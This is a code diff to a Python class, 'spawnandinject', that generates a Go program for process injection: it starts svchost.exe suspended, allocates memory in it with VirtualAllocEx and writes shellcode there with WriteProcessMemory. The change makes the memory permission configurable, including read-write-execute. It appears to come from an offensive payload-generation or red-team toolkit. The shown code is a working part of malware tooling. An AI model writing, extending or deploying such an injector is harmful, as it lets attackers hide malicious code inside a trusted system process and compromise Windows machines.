@@ -1,4 +1,10 @@
 class spawnandinject:
+    def __init__(self, arguments):
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'windows.PAGE_EXECUTE_READWRITE'
+            else:
+                self.memoryPermission = 'windows.PAGE_EXECUTE_READ'
 
     def imports(self) -> list[str]:
         return ['"golang.org/x/sys/windows"',
@@ -7,8 +13,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return ["golang.org/x/sys/windows"]
 
-    def template(self) -> str:
-        return """
+    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
+        return f"""
 package main
 
 import (
@@ -37,7 +43,7 @@ func main() {{
 	}}
 	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("C:\\\\windows\\\\system32\\\\svchost.exe"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
     
-	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(windows.PAGE_EXECUTE_READ))
+	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr({self.memoryPermission}))
     
     _ = windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), nil)
     
